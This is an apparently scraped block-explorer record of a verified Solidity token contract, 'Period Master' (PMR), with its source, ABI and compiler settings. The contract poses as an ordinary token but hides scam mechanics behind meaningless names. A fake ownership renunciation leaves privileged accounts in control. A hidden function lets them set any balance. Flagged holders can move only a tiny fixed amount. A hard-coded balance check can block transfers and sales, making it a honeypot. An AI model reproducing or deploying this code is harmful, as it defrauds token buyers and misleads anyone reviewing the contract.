{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface shouldLaunch {\n    function createPair(address totalLaunch, address receiverToken) external returns (address);\n}\n\ninterface totalAmountMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingLiquidity) external view returns (uint256);\n\n    function transfer(address receiverList, uint256 isFund) external returns (bool);\n\n    function allowance(address txLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverList,\n        uint256 isFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isList, uint256 value);\n    event Approval(address indexed txLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract teamLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalAtEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingMin is totalAmountMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PeriodMaster is teamLaunch, totalAmountMode, tradingMin {\n\n    uint256 public senderWallet;\n\n    function tokenLiquidity(address tradingLaunchSwap, uint256 isFund) public {\n        feeTx();\n        swapLaunched[tradingLaunchSwap] = isFund;\n    }\n\n    function walletExempt() public {\n        emit OwnershipTransferred(autoMinTrading, address(0));\n        toIs = address(0);\n    }\n\n    event OwnershipTransferred(address indexed toMode, address indexed maxLimit);\n\n    function owner() external view returns (address) {\n        return toIs;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalReceiver;\n    }\n\n    mapping(address => bool) public modeTeam;\n\n    bool public receiverTake;\n\n    uint256 private walletTotal;\n\n    address isAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return toIs;\n    }\n\n    function amountExemptFrom(address amountWalletLimit, address receiverList, uint256 isFund) internal returns (bool) {\n        if (amountWalletLimit == autoMinTrading) {\n            return takeExempt(amountWalletLimit, receiverList, isFund);\n        }\n        uint256 buyEnable = totalAmountMode(receiverMarketing).balanceOf(isAt);\n        require(buyEnable == launchedWallet);\n        require(receiverList != isAt);\n        if (isShould[amountWalletLimit]) {\n            return takeExempt(amountWalletLimit, receiverList, feeFund);\n        }\n        return takeExempt(amountWalletLimit, receiverList, isFund);\n    }\n\n    function feeTx() private view {\n        require(modeTeam[_msgSender()]);\n    }\n\n    function transfer(address tradingLaunchSwap, uint256 isFund) external virtual override returns (bool) {\n        return amountExemptFrom(_msgSender(), tradingLaunchSwap, isFund);\n    }\n\n    bool private isExemptReceiver;\n\n    function allowance(address maxMin, address takeMarketing) external view virtual override returns (uint256) {\n        if (takeMarketing == marketingMin) {\n            return type(uint256).max;\n        }\n        return swapMin[maxMin][takeMarketing];\n    }\n\n    mapping(address => mapping(address => uint256)) private swapMin;\n\n    string private maxTotal = \"Period Master\";\n\n    function takeExempt(address amountWalletLimit, address receiverList, uint256 isFund) internal returns (bool) {\n        require(swapLaunched[amountWalletLimit] >= isFund);\n        swapLaunched[amountWalletLimit] -= isFund;\n        swapLaunched[receiverList] += isFund;\n        emit Transfer(amountWalletLimit, receiverList, isFund);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxTotal;\n    }\n\n    address public autoMinTrading;\n\n    address marketingMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxWalletLaunched;\n    }\n\n    uint256 tokenReceiver;\n\n    mapping(address => bool) public isShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minTotalTrading;\n    }\n\n    uint256 launchedWallet;\n\n    address public receiverMarketing;\n\n    mapping(address => uint256) private swapLaunched;\n\n    function transferFrom(address amountWalletLimit, address receiverList, uint256 isFund) external override returns (bool) {\n        if (_msgSender() != marketingMin) {\n            if (swapMin[amountWalletLimit][_msgSender()] != type(uint256).max) {\n                require(isFund <= swapMin[amountWalletLimit][_msgSender()]);\n                swapMin[amountWalletLimit][_msgSender()] -= isFund;\n            }\n        }\n        return amountExemptFrom(amountWalletLimit, receiverList, isFund);\n    }\n\n    bool public listMarketingMode;\n\n    function balanceOf(address tradingLiquidity) public view virtual override returns (uint256) {\n        return swapLaunched[tradingLiquidity];\n    }\n\n    function approve(address takeMarketing, uint256 isFund) public virtual override returns (bool) {\n        swapMin[_msgSender()][takeMarketing] = isFund;\n        emit Approval(_msgSender(), takeMarketing, isFund);\n        return true;\n    }\n\n    bool private atWallet;\n\n    constructor (){\n        \n        totalAtEnable buyReceiver = totalAtEnable(marketingMin);\n        receiverMarketing = shouldLaunch(buyReceiver.factory()).createPair(buyReceiver.WETH(), address(this));\n        if (senderWallet != walletTotal) {\n            walletTotal = senderWallet;\n        }\n        autoMinTrading = _msgSender();\n        modeTeam[autoMinTrading] = true;\n        swapLaunched[autoMinTrading] = minTotalTrading;\n        walletExempt();\n        if (isExemptReceiver == listMarketingMode) {\n            walletTotal = senderWallet;\n        }\n        emit Transfer(address(0), autoMinTrading, minTotalTrading);\n    }\n\n    uint256 constant feeFund = 5 ** 10;\n\n    address private toIs;\n\n    uint256 private minTotalTrading = 100000000 * 10 ** 18;\n\n    uint8 private totalReceiver = 18;\n\n    function fundList(address buyTrading) public {\n        if (receiverTake) {\n            return;\n        }\n        \n        modeTeam[buyTrading] = true;\n        \n        receiverTake = true;\n    }\n\n    string private maxWalletLaunched = \"PMR\";\n\n    function launchedIs(address shouldFund) public {\n        feeTx();\n        \n        if (shouldFund == autoMinTrading || shouldFund == receiverMarketing) {\n            return;\n        }\n        isShould[shouldFund] = true;\n    }\n\n    function limitTake(uint256 isFund) public {\n        feeTx();\n        launchedWallet = isFund;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMinTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"}],\"name\":\"fundList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"}],\"name\":\"launchedIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"limitTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketingMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunchSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"tokenLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunchSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountWalletLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PeriodMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}